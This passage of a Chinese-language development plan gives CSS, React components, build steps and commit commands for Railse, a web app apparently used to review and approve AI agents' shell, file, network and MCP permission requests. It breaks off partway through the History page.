    --mid-bg: #3a2a08;
    --high-bg: #3b0f0f;
  }
}
* { box-sizing: border-box; }
html, body { margin: 0; background: var(--bg); color: var(--fg); font: 16px/1.45 -apple-system, BlinkMacSystemFont, "PingFang SC", "Helvetica Neue", sans-serif; -webkit-text-size-adjust: 100%; }
a { color: inherit; }
button { font: inherit; }
.app { min-height: 100dvh; padding-bottom: calc(var(--nav-h) + env(safe-area-inset-bottom)); }
.topbar { position: sticky; top: 0; z-index: 5; display: flex; align-items: center; gap: 8px; padding: calc(8px + env(safe-area-inset-top)) var(--gutter) 8px; background: var(--bg); border-bottom: 1px solid var(--line); }
.topbar h1 { font-size: 18px; margin: 0; flex: 1; }
.topbar .back { background: none; border: 0; color: var(--fg); font-size: 18px; padding: 4px 8px 4px 0; }
.page { padding: 12px var(--gutter); }
.nav { position: fixed; left: 0; right: 0; bottom: 0; height: calc(var(--nav-h) + env(safe-area-inset-bottom)); padding-bottom: env(safe-area-inset-bottom); display: flex; background: var(--bg); border-top: 1px solid var(--line); z-index: 5; }
.nav a { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 2px; text-decoration: none; color: var(--muted); font-size: 12px; position: relative; }
.nav a.active { color: var(--brand); font-weight: 600; }
.nav .badge { position: absolute; top: 6px; right: calc(50% - 22px); min-width: 18px; height: 18px; padding: 0 5px; border-radius: 9px; background: var(--high); color: #fff; font-size: 11px; line-height: 18px; text-align: center; }
.card { display: block; background: var(--card); border: 1px solid var(--line); border-radius: var(--radius); padding: 12px; margin-bottom: 10px; text-decoration: none; color: inherit; }
.card .row { display: flex; align-items: center; gap: 8px; }
.card .where { color: var(--muted); font-size: 13px; }
.card .time { margin-left: auto; color: var(--muted); font-size: 12px; white-space: nowrap; }
.card .cmd { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 14px; margin: 6px 0 0; white-space: pre-wrap; word-break: break-all; }
.tag { display: inline-block; padding: 1px 8px; border-radius: 999px; font-size: 12px; line-height: 18px; }
.tag.low { background: var(--low-bg); color: var(--low); }
.tag.mid { background: var(--mid-bg); color: var(--mid); }
.tag.high { background: var(--high-bg); color: var(--high); }
.tag.plain { background: var(--line); color: var(--muted); }
.group-title { margin: 14px 0 6px; font-size: 13px; color: var(--muted); font-weight: 600; }
.empty { padding: 40px 0; text-align: center; color: var(--muted); }
.btn { display: inline-flex; align-items: center; justify-content: center; min-height: 44px; padding: 0 16px; border-radius: 10px; border: 1px solid var(--line); background: var(--card); color: var(--fg); cursor: pointer; }
.btn.primary { background: var(--brand); color: var(--brand-fg); border-color: var(--brand); }
.btn.danger { background: var(--high); color: #fff; border-color: var(--high); }
.btn.block { width: 100%; }
.btn:disabled { opacity: 0.5; cursor: default; }
.btn-row { display: flex; gap: 10px; margin-top: 12px; }
.btn-row .btn { flex: 1; }
.field { display: block; margin: 10px 0; }
.field span { display: block; font-size: 13px; color: var(--muted); margin-bottom: 4px; }
.input, textarea.input { width: 100%; min-height: 44px; padding: 8px 12px; border: 1px solid var(--line); border-radius: 10px; background: var(--bg); color: var(--fg); font: inherit; }
textarea.input { min-height: 72px; }
.banner { padding: 10px 12px; border-radius: 10px; margin-bottom: 10px; font-size: 14px; }
.banner.warn { background: var(--high-bg); color: var(--high); }
.banner.info { background: var(--mid-bg); color: var(--mid); }
.banner.ok { background: var(--low-bg); color: var(--low); }
.banner .btn { min-height: 32px; margin-left: 8px; }
pre.block { background: var(--card); border: 1px solid var(--line); border-radius: 10px; padding: 10px; overflow-x: auto; font-size: 13px; white-space: pre-wrap; word-break: break-all; margin: 8px 0; }
dl.kv { display: grid; grid-template-columns: max-content 1fr; gap: 6px 12px; margin: 8px 0; font-size: 14px; }
dl.kv dt { color: var(--muted); }
dl.kv dd { margin: 0; word-break: break-all; }
.sheet-backdrop { position: fixed; inset: 0; background: rgba(0,0,0,0.4); z-index: 10; }
.sheet { position: fixed; left: 0; right: 0; bottom: 0; background: var(--bg); border-radius: 16px 16px 0 0; padding: 16px var(--gutter) calc(16px + env(safe-area-inset-bottom)); z-index: 11; max-height: 85dvh; overflow-y: auto; }
.sheet h2 { margin: 0 0 8px; font-size: 17px; }
.switch { display: flex; align-items: center; justify-content: space-between; padding: 12px 0; border-bottom: 1px solid var(--line); }
.switch input { width: 24px; height: 24px; }
.list-item { display: flex; align-items: center; gap: 10px; padding: 12px 0; border-bottom: 1px solid var(--line); }
.list-item .grow { flex: 1; min-width: 0; }
.list-item .sub { color: var(--muted); font-size: 13px; word-break: break-all; }
.mono { font-family: ui-monospace, SFMono-Regular, Menlo, monospace; }
.seg { display: inline-flex; border: 1px solid var(--line); border-radius: 10px; overflow: hidden; }
.seg button { border: 0; background: var(--card); color: var(--fg); padding: 8px 14px; min-height: 40px; }
.seg button.on { background: var(--brand); color: var(--brand-fg); }
.login { max-width: 360px; margin: 15vh auto 0; padding: 0 var(--gutter); }
.login h1 { text-align: center; }
.error { color: var(--high); font-size: 14px; margin: 8px 0; }
.dot { display: inline-block; width: 8px; height: 8px; border-radius: 50%; background: var(--muted); }
.dot.on { background: var(--low); }
```

`web/src/components/Banner.tsx`:
```tsx
import type { ReactNode } from 'react'

export function Banner({ tone, children }: { tone: 'warn' | 'info' | 'ok'; children: ReactNode }) {
  return (
    <div className={`banner ${tone}`} role="status">
      {children}
    </div>
  )
}
```

`web/src/StoreProvider.tsx`:
```tsx
import { createContext, useCallback, useContext, useEffect, useMemo, useReducer, useRef, type ReactNode } from 'react'
import { ApiError, hub } from './api'
import { initialState, reduce, type Action, type State } from './store'
import { Live } from './ws'

interface Store {
  state: State
  dispatch: (a: Action) => void
  /** 全量重新拉收件箱与状态（连上实时通道、回到前台、怀疑漏帧时都调）。 */
  reload: () => Promise<void>
  loadRules: () => Promise<void>
  loadMachines: () => Promise<void>
}

const Ctx = createContext<Store | null>(null)

export function StoreProvider({ children, onUnauthorized }: { children: ReactNode; onUnauthorized: () => void }) {
  const [state, dispatch] = useReducer(reduce, initialState)
  const onUnauthorizedRef = useRef(onUnauthorized)
  onUnauthorizedRef.current = onUnauthorized

  const reload = useCallback(async () => {
    try {
      const [inbox, status] = await Promise.all([hub.inbox(), hub.status()])
      dispatch({ type: 'loaded', inbox, status })
    } catch (e) {
      if (e instanceof ApiError && e.status === 401) return
      dispatch({ type: 'error', error: e instanceof Error ? e.message : String(e) })
    }
  }, [])
  const loadRules = useCallback(async () => {
    dispatch({ type: 'rules', rules: await hub.rules() })
  }, [])
  const loadMachines = useCallback(async () => {
    dispatch({ type: 'machines', machines: await hub.machines() })
  }, [])

  useEffect(() => {
    void reload()
    const live = new Live({
      onFrame: (frame) => dispatch({ type: 'frame', frame }),
      onOpen: () => {
        dispatch({ type: 'connected', connected: true })
        void reload()
      },
      onDown: (code) => {
        dispatch({ type: 'connected', connected: false })
        if (code === 1008) onUnauthorizedRef.current()
      },
    })
    live.start()
    const onVisible = () => {
      if (document.visibilityState === 'visible') void reload()
    }
    document.addEventListener('visibilitychange', onVisible)
    return () => {
      live.stop()
      document.removeEventListener('visibilitychange', onVisible)
    }
  }, [reload])

  const value = useMemo<Store>(() => ({ state, dispatch, reload, loadRules, loadMachines }), [state, reload, loadRules, loadMachines])
  return <Ctx.Provider value={value}>{children}</Ctx.Provider>
}

export function useStore(): Store {
  const s = useContext(Ctx)
  if (!s) throw new Error('useStore 必须在 StoreProvider 内使用')
  return s
}
```

`web/src/pages/Login.tsx`:
```tsx
import { useState, type FormEvent } from 'react'
import { useNavigate, useSearchParams } from 'react-router'
import { ApiError, hub } from '../api'

export function Login() {
  const [password, setPassword] = useState('')
  const [error, setError] = useState<string | null>(null)
  const [busy, setBusy] = useState(false)
  const navigate = useNavigate()
  const [params] = useSearchParams()

  async function submit(e: FormEvent) {
    e.preventDefault()
    setBusy(true)
    setError(null)
    try {
      await hub.login(password)
      const next = params.get('next')
      navigate(next && next.startsWith('/') ? next : '/', { replace: true })
    } catch (err) {
      if (err instanceof ApiError && err.status === 401) setError('密码不对')
      else if (err instanceof ApiError && err.status === 503) setError('hub 还没有设置密码，请在服务器上运行 railse hub password')
      else if (err instanceof ApiError && err.status === 429) setError('试得太频繁，一分钟后再试')
      else setError(err instanceof Error ? err.message : '登录失败')
    } finally {
      setBusy(false)
    }
  }

  return (
    <form className="login" onSubmit={submit}>
      <h1>Railse</h1>
      <label className="field">
        <span>密码</span>
        <input className="input" type="password" autoComplete="current-password" autoFocus value={password} onChange={(e) => setPassword(e.target.value)} />
      </label>
      {error && <div className="error">{error}</div>}
      <button className="btn primary block" type="submit" disabled={busy || password === ''}>
        登录
      </button>
    </form>
  )
}
```

`web/src/App.tsx`:
```tsx
import { useEffect, useState, type ReactNode } from 'react'
import { BrowserRouter, NavLink, Route, Routes, useLocation, useNavigate } from 'react-router'
import { ApiError, hub, setUnauthorizedHandler } from './api'
import { StoreProvider, useStore } from './StoreProvider'
import { Login } from './pages/Login'
import { Inbox } from './pages/Inbox'
import { RequestPage } from './pages/Request'
import { History } from './pages/History'
import { Rules } from './pages/Rules'
import { Machines } from './pages/Machines'
import { Settings } from './pages/Settings'

/** 首屏先确认登录有效；401 跳登录页并记住要回到哪里。 */
function RequireAuth({ children }: { children: ReactNode }) {
  const [ok, setOk] = useState<boolean | null>(null)
  const navigate = useNavigate()
  const location = useLocation()
  useEffect(() => {
    let alive = true
    const toLogin = () => navigate(`/login?next=${encodeURIComponent(location.pathname + location.search)}`, { replace: true })
    setUnauthorizedHandler(toLogin)
    hub.status().then(
      () => alive && setOk(true),
      (e: unknown) => {
        if (!alive) return
        if (e instanceof ApiError && e.status === 401) toLogin()
        else setOk(true) // 别的错误让页面自己显示
      },
    )
    return () => {
      alive = false
      setUnauthorizedHandler(null)
    }
    // 只在挂载时检查一次
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])
  if (ok === null) return <div className="empty">正在连接 hub…</div>
  return <StoreProvider onUnauthorized={() => navigate('/login', { replace: true })}>{children}</StoreProvider>
}

function Nav() {
  const { state } = useStore()
  const n = state.pending.length + state.questions.length
  const cls = ({ isActive }: { isActive: boolean }) => (isActive ? 'active' : '')
  return (
    <nav className="nav">
      <NavLink to="/" end className={cls}>
        收件箱{n > 0 && <span className="badge">{n}</span>}
      </NavLink>
      <NavLink to="/history" className={cls}>历史</NavLink>
      <NavLink to="/rules" className={cls}>规则</NavLink>
      <NavLink to="/machines" className={cls}>机器</NavLink>
      <NavLink to="/settings" className={cls}>设置</NavLink>
    </nav>
  )
}

function Shell() {
  return (
    <div className="app">
      <Routes>
        <Route path="/" element={<Inbox />} />
        <Route path="/r/:id" element={<RequestPage />} />
        <Route path="/history" element={<History />} />
        <Route path="/rules" element={<Rules />} />
        <Route path="/machines" element={<Machines />} />
        <Route path="/settings" element={<Settings />} />
        <Route path="*" element={<div className="empty">没有这个页面</div>} />
      </Routes>
      <Nav />
    </div>
  )
}

export function App() {
  return (
    <BrowserRouter>
      <Routes>
        <Route path="/login" element={<Login />} />
        <Route
          path="*"
          element={
            <RequireAuth>
              <Shell />
            </RequireAuth>
          }
        />
      </Routes>
    </BrowserRouter>
  )
}
```

`web/src/main.tsx`:
```tsx
import { StrictMode } from 'react'
import { createRoot } from 'react-dom/client'
import { App } from './App'
import { registerServiceWorker } from './pwa'
import './app.css'

void registerServiceWorker()
createRoot(document.getElementById('root')!).render(
  <StrictMode>
    <App />
  </StrictMode>,
)
```

六个页面的最小版本（Task 8、9 整体替换），都是同一个样子，例如 `web/src/pages/Inbox.tsx`:
```tsx
export function Inbox() {
  return (
    <>
      <header className="topbar"><h1>收件箱</h1></header>
      <div className="page"><div className="empty">加载中…</div></div>
    </>
  )
}
```
`Request.tsx` 导出 `RequestPage`，标题“请求”；`History.tsx` 导出 `History`，标题“历史”；`Rules.tsx` 导出 `Rules`，标题“规则”；`Machines.tsx` 导出 `Machines`，标题“机器”；`Settings.tsx` 导出 `Settings`，标题“设置”。

`web/public/sw.js` 先放最小版本（Task 10 替换）:
```js
// Railse Service Worker：Task 10 加入推送处理。现在只让页面能加到主屏幕。
self.addEventListener('install', () => self.skipWaiting())
self.addEventListener('activate', (event) => event.waitUntil(self.clients.claim()))
```

- [ ] **Step 5: 类型检查、测试与构建**

Run: `cd web && npm run check && npm run build && ls ../internal/hub/webui/dist && git -C .. status --short | head`
Expected: `tsc` 无错；vitest 全过；`dist/` 有 `index.html`、`assets/`、`sw.js`、`manifest.webmanifest`、`icons/`、`.gitkeep`；`git status` 里 `dist` 下只有 `.gitkeep` 被跟踪且未改。

然后在仓库根目录：`go build ./... && go test ./internal/hub/ -run RootServes -race`，Expected: 构建后 `/r/abc` 回 200 的 `index.html`。

- [ ] **Step 6: 提交**

```bash
git add web/package.json web/package-lock.json web/tsconfig.json web/vite.config.ts web/index.html web/.gitignore web/public web/src
git commit -m "feat(web): 网页工程骨架：接口层、实时通道、状态与登录页，PWA 清单与图标"
```

---

### Task 8: 收件箱、请求详情与决定面板（批准、拒绝、备注、记住前预览与范围）

**Files:**
- Create: `web/src/components/RequestCard.tsx`、`src/components/Payload.tsx`、`src/components/DecideSheet.tsx`
- Replace: `web/src/pages/Inbox.tsx`、`web/src/pages/Request.tsx`

**Interfaces:**
- `<RequestCard request />`：卡片链接到 `/r/:id`；显示机器 · 项目（webhook 显示“webhook · 标题”，question 显示“等你回答”与消息）、风险标签、相对时间、载荷摘要（等宽）、`has_redacted` 的“含隐藏部分”标签
- `<Payload payload hasRedacted />`：按类型展示载荷；`hasRedacted` 为真时先放醒目告警
- `<DecideSheet request action onClose onDone />`：`action` 为 `'allow' | 'deny'`；备注、“记住”开关、范围选择（项目/全局）、草案预览（调 `hub.propose`，范围变了重新调）、确认；成功调 `onDone(updated)`；409 时提示“请求已经处理过”并 `onDone(null)`；422 显示文案，面板不关
- 收件箱：顶部横幅（断线重连中、自动审批已暂停、iOS 未加到主屏幕、加载错误）；“等你回答”区；“待审批”按项目分组（`groupByProject`）；空态
- 详情：返回键、`Payload`、属性表（机器、项目、工具、风险、引擎理由、状态、依据、创建、过期、备注）、审计列表；pending 的 permission/webhook 底部有“拒绝”“批准”两个按钮；question 显示“去终端回答”说明；request_updated 到达（`state.tick` 变化且本条不再 pending）时重新拉取

- [ ] **Step 1: 写组件**

`web/src/components/RequestCard.tsx`:
```tsx
import { Link } from 'react-router'
import { kindLabel, payloadSummary, relativeTime, riskLabel, riskTone } from '../format'
import type { RequestView } from '../types'

export function RequestCard({ request: r }: { request: RequestView }) {
  const where = r.kind === 'webhook' ? 'webhook' : [r.machine_name, r.project].filter(Boolean).join(' · ')
  const main = r.kind === 'permission' ? payloadSummary(r.payload) : r.title
  return (
    <Link className="card" to={`/r/${encodeURIComponent(r.id)}`}>
      <div className="row">
        <span className="where">{where}</span>
        {r.kind === 'permission' ? (
          <span className={`tag ${riskTone(r.risk)}`}>{riskLabel(r.risk)}</span>
        ) : (
          <span className="tag plain">{kindLabel(r.kind)}</span>
        )}
        {r.has_redacted && <span className="tag high">含隐藏部分</span>}
        <span className="time">{relativeTime(r.created_at)}</span>
      </div>
      <pre className="cmd">{main}</pre>
    </Link>
  )
}
```

`web/src/components/Payload.tsx`:
```tsx
import { Banner } from './Banner'
import type { Payload as PayloadT } from '../types'

function prettyArgs(args: unknown): string {
  if (args === undefined || args === null) return ''
  if (typeof args === 'string') {
    try {
      return JSON.stringify(JSON.parse(args), null, 2)
    } catch {
      return args
    }
  }
  return JSON.stringify(args, null, 2)
}

export function Payload({ payload: p, hasRedacted }: { payload: PayloadT; hasRedacted: boolean }) {
  return (
    <>
      {hasRedacted && (
        <Banner tone="warn">
          命令含被隐藏的部分（凭据已替换为 &lt;redacted&gt;），下面展示的不是原文。拿不准就去终端核对再决定。
        </Banner>
      )}
      {p.type === 'shell' && (
        <>
          <pre className="block mono">{p.command}</pre>
          {p.cwd && (
            <dl className="kv">
              <dt>目录</dt>
              <dd className="mono">{p.cwd}</dd>
            </dl>
          )}
        </>
      )}
      {p.type === 'file_write' && (
        <>
          <dl className="kv">
            <dt>路径</dt>
            <dd className="mono">{p.path}</dd>
          </dl>
          {p.diff_preview && <pre className="block mono">{p.diff_preview}</pre>}
        </>
      )}
      {p.type === 'network' && (
        <dl className="kv">
          <dt>请求</dt>
          <dd className="mono">
            {p.method ? p.method + ' ' : ''}
            {p.url}
          </dd>
        </dl>
      )}
      {p.type === 'mcp' && (
        <>
          <dl className="kv">
            <dt>服务</dt>
            <dd className="mono">{p.server}</dd>
            <dt>工具</dt>
            <dd className="mono">{p.tool}</dd>
          </dl>
          {p.args !== undefined && <pre className="block mono">{prettyArgs(p.args)}</pre>}
        </>
      )}
      {!['shell', 'file_write', 'network', 'mcp'].includes(p.type) && <pre className="block mono">{JSON.stringify(p, null, 2)}</pre>}
    </>
  )
}
```

`web/src/components/DecideSheet.tsx`:
```tsx
import { useEffect, useState } from 'react'
import { ApiError, hub } from '../api'
import type { Draft, RequestView } from '../types'

interface Props {
  request: RequestView
  action: 'allow' | 'deny'
  onClose: () => void
  /** 决定成功时带更新后的请求；请求已被别处处理时带 null。 */
  onDone: (updated: RequestView | null) => void
}

const payloadNames: Record<string, string> = { shell: '命令', file_write: '文件改动', network: '访问', mcp: 'MCP 调用' }

export function DecideSheet({ request, action, onClose, onDone }: Props) {
  const [note, setNote] = useState('')
  const [remember, setRemember] = useState(false)
  const [scope, setScope] = useState<'project' | 'global'>(request.project_root ? 'project' : 'global')
  const [draft, setDraft] = useState<Draft | null>(null)
  const [draftError, setDraftError] = useState<string | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [busy, setBusy] = useState(false)
  const canRemember = request.kind !== 'webhook' && !request.has_redacted

  useEffect(() => {
    if (!remember) return
    let alive = true
    setDraft(null)
    setDraftError(null)
    hub.propose(request.id, { action, scope }).then(
      (d) => alive && setDraft(d),
      (e: unknown) => {
        if (!alive) return
        setDraftError(e instanceof Error ? e.message : '生成草案失败')
      },
    )
    return () => {
      alive = false
    }
  }, [remember, scope, action, request.id])

  async function confirm() {
    setBusy(true)
    setError(null)
    try {
      const updated = await hub.decide(request.id, { action, note: note.trim() || undefined, remember: remember && !!draft, scope })
      onDone(updated)
    } catch (e) {
      if (e instanceof ApiError && e.status === 409) {
        setError(e.message)
        onDone(null)
      } else {
        setError(e instanceof Error ? e.message : '决定失败')
      }
    } finally {
      setBusy(false)
    }
  }

  const verb = action === 'allow' ? '批准' : '拒绝'
  return (
    <>
      <div className="sheet-backdrop" onClick={onClose} />
      <div className="sheet" role="dialog" aria-label={verb}>
        <h2>{verb}这次{payloadNames[request.payload.type] ?? '操作'}</h2>
        <label className="field">
          <span>备注（只进审计，不会给 agent 看）</span>
          <textarea className="input" value={note} maxLength={1000} onChange={(e) => setNote(e.target.value)} />
        </label>
        <label className="switch">
          <span>
            记住：以后这类{action === 'allow' ? '自动放行' : '自动拒绝'}
            {!canRemember && <span className="sub"><br />{request.kind === 'webhook' ? 'webhook 请求不能记住' : '含凭据的命令不能记住'}</span>}
          </span>
          <input type="checkbox" checked={remember} disabled={!canRemember} onChange={(e) => setRemember(e.target.checked)} />
        </label>
        {remember && (
          <div className="card">
            <div className="row">
              <span>范围</span>
              <span className="seg" style={{ marginLeft: 'auto' }}>
                <button type="button" className={scope === 'project' ? 'on' : ''} disabled={!request.project_root} onClick={() => setScope('project')}>
                  项目 {request.project || ''}
                </button>
                <button type="button" className={scope === 'global' ? 'on' : ''} onClick={() => setScope('global')}>
                  全局
                </button>
              </span>
            </div>
            {draftError && <div className="error">{draftError}</div>}
            {draft && (
              <>
                <p>
                  将{draft.summary.action === 'allow' ? '放行' : '拒绝'}
                  {payloadNames[draft.summary.payload] ?? ''} <code className="mono">{draft.summary.anchor}</code>
                  {draft.scope === 'project' ? `（仅项目 ${request.project}）` : '（所有项目）'}
                </p>
                <details>
                  <summary>规则原文 {draft.rule_id}</summary>
                  <pre className="block mono">{draft.yaml}</pre>
                </details>
              </>
            )}
            {!draft && !draftError && <div className="sub">正在生成草案…</div>}
          </div>
        )}
        {error && <div className="error">{error}</div>}
        <div className="btn-row">
          <button type="button" className="btn" onClick={onClose} disabled={busy}>
            取消
          </button>
          <button
            type="button"
            className={`btn ${action === 'allow' ? 'primary' : 'danger'}`}
            onClick={confirm}
            disabled={busy || (remember && !draft)}
          >
            {remember ? `${verb}并记住` : verb}
          </button>
        </div>
      </div>
    </>
  )
}
```

- [ ] **Step 2: 写收件箱与详情页**

`web/src/pages/Inbox.tsx`:
```tsx
import { useState } from 'react'
import { Link } from 'react-router'
import { Banner } from '../components/Banner'
import { RequestCard } from '../components/RequestCard'
import { isIOS, isStandalone } from '../pwa'
import { groupByProject } from '../store'
import { useStore } from '../StoreProvider'

const guideKey = 'railse.hideInstallGuide'

export function Inbox() {
  const { state, reload } = useStore()
  const [hideGuide, setHideGuide] = useState(() => {
    try {
      return localStorage.getItem(guideKey) === '1'
    } catch {
      return false
    }
  })
  const showGuide = isIOS() && !isStandalone() && !hideGuide
  const groups = groupByProject(state.pending)
  const empty = state.loaded && state.pending.length === 0 && state.questions.length === 0

  function dismissGuide() {
    setHideGuide(true)
    try {
      localStorage.setItem(guideKey, '1')
    } catch {
      // 隐私模式等情况下存不了，本次会话内不再显示即可
    }
  }

  return (
    <>
      <header className="topbar">
        <h1>收件箱</h1>
        <span className={`dot ${state.connected ? 'on' : ''}`} title={state.connected ? '实时连接正常' : '实时连接断开'} />
      </header>
      <div className="page">
        {!state.connected && state.loaded && <Banner tone="info">实时连接断开，正在重连；下拉或切回页面会重新加载。</Banner>}
        {state.error && (
          <Banner tone="warn">
            {state.error}
            <button type="button" className="btn" onClick={() => void reload()}>重试</button>
          </Banner>
        )}
        {state.status?.paused && (
          <Banner tone="info">
            自动审批已暂停，所有请求都交回终端处理。<Link to="/settings">去设置</Link>
          </Banner>
        )}
        {showGuide && (
          <Banner tone="info">
            在 iPhone 上要先用 Safari 的“分享 → 添加到主屏幕”，再从主屏幕图标打开，才能收到通知。
            <button type="button" className="btn" onClick={dismissGuide}>知道了</button>
          </Banner>
        )}
        {state.questions.length > 0 && (
          <>
            <div className="group-title">等你回答</div>
            {state.questions.map((q) => (
              <RequestCard key={q.id} request={q} />
            ))}
          </>
        )}
        {groups.map((g) => (
          <div key={g.project}>
            <div className="group-title">{g.project}</div>
            {g.items.map((r) => (
              <RequestCard key={r.id} request={r} />
            ))}
          </div>
        ))}
        {!state.loaded && !state.error && <div className="empty">加载中…</div>}
        {empty && <div className="empty">没有等你处理的事</div>}
      </div>
    </>
  )
}
```

`web/src/pages/Request.tsx`:
```tsx
import { useEffect, useState } from 'react'
import { useNavigate, useParams } from 'react-router'
import { ApiError, hub } from '../api'
import { Banner } from '../components/Banner'
import { DecideSheet } from '../components/DecideSheet'
import { Payload } from '../components/Payload'
import { decidedByLabel, kindLabel, relativeTime, riskLabel, riskTone, stateLabel } from '../format'
import { useStore } from '../StoreProvider'
import type { AuditEvent, RequestView } from '../types'

function detailText(e: AuditEvent): string {
  try {
    const d = JSON.parse(e.detail) as Record<string, unknown>
    return Object.entries(d)
      .filter(([, v]) => v !== '' && v !== null && v !== false)
      .map(([k, v]) => `${k}=${typeof v === 'string' ? v : JSON.stringify(v)}`)
      .join(' ')
  } catch {
    return e.detail
  }
}

export function RequestPage() {
  const { id = '' } = useParams()
  const navigate = useNavigate()
  const { state } = useStore()
  const [data, setData] = useState<{ request: RequestView; audit: AuditEvent[] } | null>(null)
  const [error, setError] = useState<string | null>(null)
  const [action, setAction] = useState<'allow' | 'deny' | null>(null)
  const [flash, setFlash] = useState<string | null>(null)

  async function load() {
    try {
      setData(await hub.request(id))
      setError(null)
    } catch (e) {
      setError(e instanceof ApiError && e.status === 404 ? '没有这条请求' : e instanceof Error ? e.message : '加载失败')
    }
  }
  useEffect(() => {
    void load()
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [id])
  // 实时通道报告了变化：本条若已不在待审批里，重新拉一次拿到终态
  useEffect(() => {
    if (data?.request.state === 'pending' && !state.pending.some((r) => r.id === id)) void load()
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [state.tick])

  const r = data?.request
  const canDecide = r && r.state === 'pending' && (r.kind === 'permission' || r.kind === 'webhook')

  return (
    <>
      <header className="topbar">
        <button type="button" className="back" onClick={() => (window.history.length > 1 ? navigate(-1) : navigate('/'))} aria-label="返回">
          ‹
        </button>
        <h1>{r ? kindLabel(r.kind) : '请求'}</h1>
        {r?.kind === 'permission' && <span className={`tag ${riskTone(r.risk)}`}>{riskLabel(r.risk)}</span>}
      </header>
      <div className="page">
        {error && <Banner tone="warn">{error}</Banner>}
        {flash && <Banner tone="ok">{flash}</Banner>}
        {r && (
          <>
            {r.kind === 'question' && (
              <Banner tone="info">agent 在终端里等你回答这个问题；它继续之后这条会自动消失。</Banner>
            )}
            {r.kind === 'webhook' ? <pre className="block">{r.title}</pre> : r.kind === 'permission' ? <Payload payload={r.payload} hasRedacted={r.has_redacted} /> : <pre className="block">{r.title}</pre>}
            <dl className="kv">
              {r.machine_name && (
                <>
                  <dt>机器</dt>
                  <dd>{r.machine_name}</dd>
                </>
              )}
              {r.project_root && (
                <>
                  <dt>项目</dt>
                  <dd className="mono">{r.project_root}</dd>
                </>
              )}
              {r.tool_name && (
                <>
                  <dt>工具</dt>
                  <dd>{r.tool_name}</dd>
                </>
              )}
              {r.engine_reason && (
                <>
                  <dt>引擎</dt>
                  <dd>{r.engine_reason}</dd>
                </>
              )}
              <dt>状态</dt>
              <dd>
                {stateLabel(r.state)}
                {r.state !== 'pending' && decidedByLabel(r) ? `，${decidedByLabel(r)}` : ''}
                {r.delivered_at ? '，已送达' : ''}
              </dd>
              {r.decision_note && (
                <>
                  <dt>备注</dt>
                  <dd>{r.decision_note}</dd>
                </>
              )}
              <dt>创建</dt>
              <dd>{relativeTime(r.created_at)}</dd>
              {r.expires_at && r.state === 'pending' && (
                <>
                  <dt>过期</dt>
                  <dd>{new Date(r.expires_at).toLocaleString()}</dd>
                </>
              )}
            </dl>
            {canDecide && (
              <div className="btn-row">
                <button type="button" className="btn danger" onClick={() => setAction('deny')}>拒绝</button>
                <button type="button" className="btn primary" onClick={() => setAction('allow')}>批准</button>
              </div>
            )}
            {data.audit.length > 0 && (
              <>
                <div className="group-title">审计</div>
                {data.audit.map((e) => (
                  <div className="list-item" key={e.id}>
                    <div className="grow">
                      <div>
                        {e.action} <span className="sub">{e.actor}</span>
                      </div>
                      <div className="sub mono">{detailText(e)}</div>
                    </div>
                    <span className="sub">{relativeTime(e.ts)}</span>
                  </div>
                ))}
              </>
            )}
          </>
        )}
        {!r && !error && <div className="empty">加载中…</div>}
      </div>
      {r && action && (
        <DecideSheet
          request={r}
          action={action}
          onClose={() => setAction(null)}
          onDone={(updated) => {
            setAction(null)
            if (updated) {
              setData((d) => (d ? { ...d, request: updated } : d))
              setFlash(updated.state === 'approved' ? '已批准，决定正在送回 agent' : '已拒绝')
            }
            void load()
          }}
        />
      )}
    </>
  )
}
```

- [ ] **Step 3: 类型检查、构建并手工过一遍**

Run: `cd web && npm run check && npm run build`
Expected: 无类型错误，构建成功。

手工检查（开发者本机）：
```bash
# 终端 1：起 hub（第一次先 railse hub password）
go run ./cmd/railse hub run --dir /tmp/rs-hub --foreground
# 终端 2：起网页开发服务器
cd web && npm run dev
```
用手机或浏览器开 `http://localhost:5173`：登录 → 空收件箱 → 用 `railse hub webhook-token` 生成令牌后 `curl -H "Authorization: Bearer <令牌>" -H 'Content-Type: application/json' -d '{"title":"部署 v1","callback_url":"https://example.com/cb"}' http://127.0.0.1:8787/api/webhook/approvals` → 收件箱实时出现 → 点开 → 批准 → 卡片消失、详情显示已批准。

- [ ] **Step 4: 提交**

```bash
git add web/src/components web/src/pages/Inbox.tsx web/src/pages/Request.tsx
git commit -m "feat(web): 收件箱按项目分组与等你回答，请求详情与决定面板（备注、记住前预览与范围）"
```

---

### Task 9: 历史、规则、机器与设置页

**Files:**
- Replace: `web/src/pages/History.tsx`、`Rules.tsx`、`Machines.tsx`、`Settings.tsx`

**Interfaces:**
- 历史：状态筛选（全部、已批准、已拒绝、自动放行、自动拒绝、交回终端、已过期、已取消、只展示的记录）；列表卡片带状态与依据；“加载更多”把 limit 从 100 升到 500；`state.tick` 变化时重新拉取
- 规则：列表来自 `useStore().state.rules`（挂载时与 `rulesStale` 为真时 `loadRules()`）；每条显示 id、来源标签、`elevated` 红标“可放行高风险操作”、启停开关（`hub.setRuleEnabled`）、命中次数与最近命中、展开看 YAML；非 builtin 可删除（确认框）；导入（选 YAML 文件 → `hub.importRules`）与导出（链接到 `hub.exportRulesURL`）
- 机器：在线点、名字、版本、最近在线；吊销（确认框）；已吊销灰显
- 设置：总开关（`hub.pause` / `hub.resume`，改完 `reload()`）；hub 信息（规则版本、运行时长、在线机器数）；退出登录；通知区块在 Task 10 加

- [ ] **Step 1: 写四个页面**

`web/src/pages/History.tsx`:
```tsx
import { useEffect, useState } from 'react'
import { Link } from 'react-router'
import { hub } from '../api'
import { Banner } from '../components/Banner'
import { decidedByLabel, kindLabel, payloadSummary, relativeTime, stateLabel } from '../format'
import { useStore } from '../StoreProvider'
import type { RequestView } from '../types'

const filters: [string, string][] = [
  ['', '全部'],
  ['approved', '已批准'],
  ['denied', '已拒绝'],
  ['auto_allowed', '自动放行'],
  ['auto_denied', '自动拒绝'],
  ['passthrough', '交回终端'],
  ['expired', '已过期'],
  ['cancelled', '已取消'],
  ['recorded', '问题与完成'],
]

export function History() {
  const { state } = useStore()
  const [filter, setFilter] = useState('')
  const [limit, setLimit] = useState(100)
  const [items, setItems] = useState<RequestView[] | null>(null)
  const [error, setError] = useState<string | null>(null)

  useEffect(() => {
    let alive = true
    hub.requests(filter, limit).then(
